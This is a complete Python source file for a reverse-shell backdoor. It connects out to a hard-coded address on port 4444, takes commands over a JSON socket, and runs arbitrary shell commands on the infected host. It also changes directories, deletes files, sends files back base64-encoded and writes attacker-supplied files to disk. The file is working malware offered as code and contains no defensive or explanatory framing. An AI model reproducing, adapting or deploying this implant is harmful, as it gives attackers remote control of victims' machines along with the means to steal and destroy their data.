import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port), )

    def execute_system_command(self, command):
        try:
            response = subprocess.check_output(command, shell=True)
        except:
            response = "[-] Command Error".encode()
        return response

    # def decode_command(self, command):
    #     return str(command, 'utf-8')

    def reliable_send(self, data):
        data = data.decode()
        json_data = json.dumps(data)
        json_data = json_data.encode()
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024).decode())
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_dir(self, path):
        try:
            os.chdir(path)
            mssg = "[+} Changing Directory to " + path
            return mssg.encode()
        except:
            mssg = "[+} Changing Directory Failed to " + path
            return mssg.encode()

    def delete_file(self, path):
        try:
            os.remove(path)
            mssg = "[+} Removed  " + path
            return mssg.encode()
        except:
            mssg = "[+} Removing Faild " + path
            return mssg.encode()

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            mssg = "[+} File not Found  "
            return mssg.encode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Suscessfull.".encode()

    def run(self):
        while True:
            command = self.reliable_recv()
            command_result = ""
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                path = str(" ".join(command[1:]))
                command_result = self.change_working_dir(path)
            elif command[0] == "del" and len(command) > 1:
                path = str(" ".join(command[1:]))
                command_result = self.delete_file(path)
            elif command[0] == "download":
                path = str(" ".join(command[1:]))
                command_result = self.read_file(path)
            elif command[0] == "upload":
                # path = str(" ".join(command[1:]))
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)
        self.connection.close()


ip = "192.168.100.2"
port = 4444
my_backdoor = Backdoor(ip, port)
my_backdoor.run()
